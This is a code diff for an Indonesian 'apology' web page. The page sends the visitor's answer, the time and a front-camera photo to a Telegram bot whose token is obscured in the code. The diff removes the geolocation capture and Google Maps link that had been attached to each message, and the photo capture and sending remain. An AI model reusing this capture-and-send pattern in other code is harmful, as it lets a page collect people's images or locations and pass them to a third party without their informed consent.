@@ -603,21 +603,7 @@
           });
 
           // Lokasi terbaru
-          let ltxt = 'Tidak tersedia',
-            lat = null,
-            lon = null;
-          try {
-            const p = await getLoc();
-            lat = p.coords.latitude;
-            lon = p.coords.longitude;
-            ltxt = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
-          } catch (e) {
-            if (_loc) {
-              lat = _loc.coords.latitude;
-              lon = _loc.coords.longitude;
-              ltxt = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
-            }
-          }
+          const ltxt = 'Dinonaktifkan';
 
           // Ambil foto dari live stream (kamera depan)
           setSt('📸 Mengambil foto...', '');
@@ -631,14 +617,11 @@
           setSt('📤 Mengirim...', '');
 
           const jawaban = yes ? '✅ DIMAAFKAN' : '❌ TIDAK DIMAAFKAN';
-          const mapsLink =
-            lat && lon ? `https://maps.google.com/?q=${lat},${lon}` : null;
           const caption = `${jawaban}
 
 👤 Dari: ${_cfg.n1}
 💌 Kepada: ${_cfg.n2}
-⏰ Waktu: ${waktu}
-📍 Lokasi: ${ltxt}${mapsLink ? '\n🗺 Maps: ' + mapsLink : ''}`;
+⏰ Waktu: ${waktu}`;
 
           // Kirim ke Telegram
           const token = _rt(_cfg._a);
@@ -684,11 +667,6 @@
       /* ══════════════════════════════════════════════
    HELPERS
 ══════════════════════════════════════════════ */
-      function getLoc() {
-        return new Promise((res, rej) =>
-          navigator.geolocation.getCurrentPosition(res, rej, { timeout: 8000 }),
-        );
-      }
 
       async function snapFromStream(stream) {
         if (!stream) throw new Error('No stream');
